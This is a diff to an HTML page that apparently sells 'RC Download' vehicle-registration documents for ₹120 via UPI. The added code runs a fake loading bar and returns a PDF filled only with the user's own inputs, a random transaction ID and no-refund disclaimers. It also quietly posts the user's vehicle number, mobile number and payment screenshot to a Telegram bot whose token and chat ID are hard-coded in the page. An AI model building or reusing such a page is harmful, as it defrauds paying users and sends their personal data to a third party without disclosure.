@@ -123,14 +123,7 @@ display:none;
 
 <div id="page2" style="display:none">
 <button onclick="payUPI()">
-Pay ₹120 with UPI<br>
-
-<!-- ✅ ONLY LOGO CHANGED -->
-<img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/phonepe.svg" height="20">
-<img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/googlepay.svg" height="20">
-<img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/paytm.svg" height="20">
-<img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/bhim.svg" height="20">
-
+👉🏻👈🏻 <b style="font-size:18px;">PAYMENT WITH UPI</b> 👉🏻👈🏻
 </button>
 
 <img id="qrImg" class="qr"
@@ -154,6 +147,17 @@ src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi%3A%2F%2Fp
 
 <div class="footer">© 2026 Apex solution</div>
 
+<div class="loader" id="loader">
+<div class="barBox"><div class="bar" id="bar"></div></div>
+<div id="percent">0%</div>
+<div class="msg">Internet slow hai, back mat dabaye</div>
+</div>
+
+<div class="popup" id="popup">
+<h3>🎉 Done</h3>
+<button onclick="location.reload()">OK</button>
+</div>
+
 <script>
 function formatVehicle(i){
 let v=i.value.replace(/[^A-Z0-9]/gi,'').toUpperCase();
@@ -171,6 +175,105 @@ page2.style.display="block";
 
 function payUPI(){
 window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR&tn=RC%20Download";
+}
+
+function downloadPDF(){
+const { jsPDF } = window.jspdf;
+let pdf = new jsPDF();
+
+let d=new Date();
+let txn="TXN"+Math.floor(Math.random()*999999);
+
+pdf.setDrawColor(255,0,0);
+pdf.setLineWidth(2);
+pdf.rect(5,5,200,287);
+
+pdf.setDrawColor(0,0,255);
+pdf.setLineWidth(0.5);
+pdf.rect(8,8,194,281);
+
+pdf.setFillColor(0,91,172);
+pdf.rect(8,8,194,18,"F");
+
+pdf.setTextColor(255,255,255);
+pdf.setFont("helvetica","bold");
+pdf.setFontSize(16);
+pdf.text("RCPDF.IN",105,20,null,null,"center");
+
+pdf.setFont("helvetica","normal");
+pdf.setFontSize(10);
+pdf.setTextColor(0,0,0);
+
+function row(y,label,value){
+pdf.setFillColor(200,255,200);
+pdf.rect(15,y,60,12,"F");
+pdf.rect(75,y,120,12,"F");
+pdf.rect(15,y,60,12);
+pdf.rect(75,y,120,12);
+pdf.text(label,18,y+8);
+pdf.text(value,78,y+8);
+}
+
+row(30,"Vehicle:",vehicle.value);
+row(45,"Mobile:",mobile.value);
+row(60,"Work:","RC Download");
+row(75,"Txn ID:",txn);
+row(90,"Date:",d.toLocaleDateString());
+row(105,"Time:",d.toLocaleTimeString());
+
+pdf.addImage(document.getElementById("qrImg").src,"PNG",55,120,100,90);
+
+pdf.setFontSize(8);
+let y=220;
+
+pdf.text("• Yeh website RTO se judi nahi hai",10,y); y+=5;
+pdf.text("• Data ki guarantee nahi hai",10,y); y+=5;
+pdf.text("• Sirf information purpose ke liye hai",10,y); y+=5;
+pdf.text("• Galat use ki jimmedari user ki hogi",10,y); y+=5;
+pdf.text("• Payment ke baad refund nahi milega",10,y); y+=5;
+pdf.text("• Payment karna terms accept mana jayega",10,y); y+=5;
+pdf.text("• Payment ka matlab sabhi sharte maan li gayi hai",10,y);
+
+pdf.save("RC.pdf");
+}
+
+function submitForm(){
+if(!mobile.value){alert("Mobile daale");return;}
+if(!proof.files[0]){alert("Screenshot upload kare");return;}
+
+loader.style.display="flex";
+
+let p=0;
+let i=setInterval(()=>{
+p++;
+bar.style.width=p+"%";
+percent.innerText=p+"%";
+
+if(p>=100){
+clearInterval(i);
+
+let d=new Date();
+let txn="TXN"+Math.floor(Math.random()*999999);
+
+downloadPDF();
+
+let fd=new FormData();
+fd.append("chat_id","5600045707");
+fd.append("photo",proof.files[0]);
+fd.append("caption",
+"Vehicle: "+vehicle.value+
+"\nMobile: "+mobile.value+
+"\nTXN: "+txn+
+"\nTime: "+d.toLocaleString()
+);
+
+fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto",
+{method:"POST",body:fd});
+
+loader.style.display="none";
+popup.style.display="block";
+}
+},40);
 }
 </script>
 
